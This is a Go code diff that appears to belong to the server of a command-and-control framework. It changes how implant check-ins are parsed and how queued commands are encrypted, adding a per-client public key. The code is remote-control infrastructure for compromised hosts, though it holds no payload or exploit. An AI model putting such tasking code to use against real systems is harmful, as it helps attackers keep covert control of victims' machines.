@@ -10,6 +10,7 @@ import (
 	"BackendTemplate/pkg/qqwry"
 	"BackendTemplate/pkg/utils"
 	"BackendTemplate/pkg/webhooks"
+	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
@@ -328,7 +329,7 @@ func parseMetadata(encryptMetainfo string) ([]byte, string, error) {
 		return nil, "", fmt.Errorf("decode base64 failed: %w", err)
 	}
 
-	metainfo, err := encrypt.Decrypt(tmpMetainfo)
+	metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
 	if err != nil {
 		return nil, "", fmt.Errorf("decrypt failed: %w", err)
 	}
@@ -384,6 +385,7 @@ func handleFirstBlood(uid string, metainfo []byte, r *http.Request) error {
 		Sleep:      "5",
 		Online:     "1",
 		Color:      "",
+		PublicKey:  clientInfo.PublicKey,
 	}
 
 	// 插入记录
@@ -431,6 +433,7 @@ type ClientInfo struct {
 	Address     string
 	Arch        string
 	FirstStart  string
+	PublicKey   string
 }
 
 // parseClientInfo 解析客户端信息
@@ -438,7 +441,8 @@ func parseClientInfo(metainfo []byte, r *http.Request) (*ClientInfo, error) {
 	if len(metainfo) < 9 {
 		return nil, fmt.Errorf("metainfo too short: %d bytes", len(metainfo))
 	}
-
+	publicKey := metainfo[:32]
+	metainfo = metainfo[32:]
 	// 安全解析
 	processID := binary.BigEndian.Uint32(metainfo[:4])
 	flag := int(metainfo[4])
@@ -503,6 +507,7 @@ func parseClientInfo(metainfo []byte, r *http.Request) (*ClientInfo, error) {
 		Address:     address,
 		Arch:        arch,
 		FirstStart:  formattedTime,
+		PublicKey:   base64.StdEncoding.EncodeToString(publicKey[:]),
 	}, nil
 }
 
@@ -528,12 +533,12 @@ func handlePullCommands(uid string, clientRecord *database.Clients, w http.Respo
 		//}
 
 		// 有命令需要执行
-		cmdBytes, err := encrypt.Encrypt(cmdBytes)
+		cmdBytes, err := encrypt.Encrypt(cmdBytes, uid)
 		if err != nil {
 			return fmt.Errorf("encrypt command failed: %w", err)
 		}
 
-		cmdBytes, err = encrypt.Encrypt(cmdBytes)
+		cmdBytes, err = encrypt.Encrypt(cmdBytes, uid)
 		if err != nil {
 			return fmt.Errorf("second encrypt failed: %w", err)
 		}
@@ -598,7 +603,7 @@ func handlePullCommands(uid string, clientRecord *database.Clients, w http.Respo
 
 // sendSuccessResponse 发送成功响应
 func sendSuccessResponse(w http.ResponseWriter, uid string) {
-	successBytes, err := encrypt.Encrypt([]byte("success"))
+	successBytes, err := encrypt.Encrypt([]byte("success"), uid)
 	if err != nil {
 		logger.Error("Encrypt success message failed:", err)
 		w.WriteHeader(http.StatusInternalServerError)
